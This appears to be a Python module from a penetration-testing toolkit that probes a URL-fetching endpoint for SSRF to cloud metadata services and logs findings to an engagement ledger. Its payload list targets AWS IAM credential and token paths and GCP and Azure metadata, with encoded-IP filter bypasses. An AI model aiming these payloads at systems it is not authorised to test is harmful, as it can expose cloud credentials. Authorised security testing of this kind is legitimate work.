"""Cloud metadata SSRF pack — 169.254 probes, opt-in (Backlog #42).

Explicit, aggressive testing of one URL-fetching endpoint YOU own: the
operator points the pack at `target` with the name of the parameter
that fetches URLs (`param`), and the pack substitutes each cloud
metadata payload in turn, comparing responses against a benign
baseline. A response containing metadata markers (ami-id,
security-credentials, computeMetadata, …) is verdict VULNERABLE;
anything else is SAFE with status/length evidence.

Payloads cover AWS, GCP and Azure metadata endpoints plus decimal /
octal / hex IP-encoding bypass variants. The pack only ever sends
plain GET/POST requests to the operator-supplied target — the
link-local payloads only resolve inside the *target's* network. Like
the rest of the toolkit this is opt-in and off by default: merely
opening the UI never probes anything.

Findings ledger as engagement vulns on the target host when
`engagement_id` is given (scope-enforced; hostnames that are not
in-scope IPs are reported and never stored). Sandbox returns canned
findings without touching the network.
"""

from __future__ import annotations

import logging
import time
import urllib.parse
import urllib.request
from typing import Any

logger = logging.getLogger("h4k.ssrf_pack")

# (name, payload URL) — the pack: AWS, GCP, Azure + encoding bypasses.
PAYLOADS: list[tuple[str, str]] = [
    ("aws-meta", "http://169.254.169.254/latest/meta-data/"),
    ("aws-iam", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("aws-token", "http://169.254.169.254/latest/api/token"),
    ("gcp-meta", "http://metadata.google.internal/computeMetadata/v1/"),
    ("gcp-ip", "http://169.254.169.254/computeMetadata/v1/"),
    ("azure-imds", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
    ("linklocal-root", "http://169.254.169.254/"),
    ("decimal-ip", "http://2852039166/latest/meta-data/"),
    ("octal-ip", "http://0251.0376.0254.0376/latest/meta-data/"),
    ("hex-ip", "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/"),
]

# Markers that only appear when a metadata service actually answered
# through the target (case-insensitive substring match).
MARKERS: tuple[str, ...] = (
    "ami-id",
    "instance-id",
    "availability-zone",
    "security-credentials",
    "computeMetadata",
    "instance/attributes",
    "azure",
    "subscriptionId",
    "metadata/instance",
)

BASELINE_SENTINEL = "http://example.invalid/h4k-baseline"


def _fetch(
    url: str, method: str, param: str, value: str, timeout: float
) -> dict[str, Any]:
    """One request with `param` set to `value`. Never raises."""
    started = time.time()
    try:
        if method == "POST":
            data = urllib.parse.urlencode({param: value}).encode()
            req = urllib.request.Request(url, data=data, method="POST")
        else:
            parts = urllib.parse.urlsplit(url)
            query = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
            query.append((param, value))
            url = urllib.parse.urlunsplit(
                (
                    parts.scheme,
                    parts.netloc,
                    parts.path,
                    urllib.parse.urlencode(query),
                    parts.fragment,
                )
            )
            req = urllib.request.Request(url, method="GET")
        with urllib.request.urlopen(
            req, timeout=timeout
        ) as resp:  # nosec B310 - operator-supplied lab target
            body = resp.read(8192).decode("utf-8", errors="replace")
            return {
                "status": resp.status,
                "length": len(body),
                "body": body,
                "elapsed": round(time.time() - started, 2),
            }
    except Exception as exc:
        return {
            "status": None,
            "length": 0,
            "body": "",
            "elapsed": round(time.time() - started, 2),
            "error": str(exc)[:160],
        }


def _verdict(body: str) -> tuple[str, str]:
    lowered = body.lower()
    hits = sorted({m for m in MARKERS if m.lower() in lowered})
    if hits:
        return "VULNERABLE", f"metadata markers in response: {', '.join(hits)}"
    return "SAFE", "no metadata markers in response"


def probe_target(
    target: str,
    param: str = "url",
    method: str = "GET",
    payload_names: list[str] | None = None,
    timeout: float = 10.0,
) -> dict[str, Any]:
    """Run the metadata payload pack against one endpoint."""
    target = (target or "").strip()
    if not target:
        raise ValueError("target required")
    if not target.startswith(("http://", "https://")):
        raise ValueError("target must be an http(s) URL you own")
    param = (param or "url").strip() or "url"
    method = (method or "GET").upper()
    if method not in ("GET", "POST"):
        raise ValueError("method must be GET or POST")
    wanted = set(payload_names or [])
    pack = [p for p in PAYLOADS if not wanted or p[0] in wanted]
    if payload_names and not pack:
        raise ValueError(f"unknown payloads: {sorted(wanted)}")

    baseline = _fetch(target, method, param, BASELINE_SENTINEL, timeout)
    probes: list[dict[str, Any]] = []
    for name, payload in pack:
        res = _fetch(target, method, param, payload, timeout)
        verdict, evidence = _verdict(res.get("body") or "")
        probes.append(
            {
                "name": name,
                "payload": payload,
                "verdict": verdict,
                "evidence": evidence,
                "status": res.get("status"),
                "length": res.get("length"),
                "elapsed": res.get("elapsed"),
            }
        )
    vulnerable = [p for p in probes if p["verdict"] == "VULNERABLE"]
    return {
        "target": target,
        "param": param,
        "method": method,
        "baseline": {
            "status": baseline.get("status"),
            "length": baseline.get("length"),
        },
        "probes": probes,
        "probe_count": len(probes),
        "vulnerable": [p["name"] for p in vulnerable],
        "vulnerable_count": len(vulnerable),
        "at_risk": bool(vulnerable),
    }


def to_ledger(
    host: str, target: str, probes: list[dict[str, Any]]
) -> list[dict[str, Any]]:
    """Map VULNERABLE probes to engagement vuln rows for the target host."""
    rows: list[dict[str, Any]] = []
    for probe in probes:
        if probe.get("verdict") != "VULNERABLE":
            continue
        rows.append(
            {
                "host": host,
                "name": f"ssrf {probe.get('name')} via {target}"[:220],
                "severity": "CRITICAL",
                "module": "ssrf-pack",
                "reference": "",
                "cwe": "CWE-918",
                "detail": f"payload={probe.get('payload')} evidence={probe.get('evidence')}".strip(),
            }
        )
    return rows


def sandbox_result(target: str = "http://lab.local/fetch") -> dict[str, Any]:
    """Canned pack result (no requests sent)."""
    first = {
        "name": "aws-meta",
        "payload": dict(PAYLOADS)["aws-meta"],
        "verdict": "VULNERABLE",
        "evidence": "metadata markers in response: ami-id, instance-id (sandbox)",
        "status": 200,
        "length": 512,
        "elapsed": 0.12,
    }
    rest = [
        {
            "name": name,
            "payload": payload,
            "verdict": "SAFE",
            "evidence": "no metadata markers in response (sandbox)",
            "status": 200,
            "length": 64,
            "elapsed": 0.05,
        }
        for name, payload in PAYLOADS[1:]
    ]
    probes = [first, *rest]
    return {
        "target": target or "http://lab.local/fetch",
        "param": "url",
        "method": "GET",
        "baseline": {"status": 200, "length": 32},
        "probes": probes,
        "probe_count": len(probes),
        "vulnerable": ["aws-meta"],
        "vulnerable_count": 1,
        "at_risk": True,
        "sandbox": True,
    }
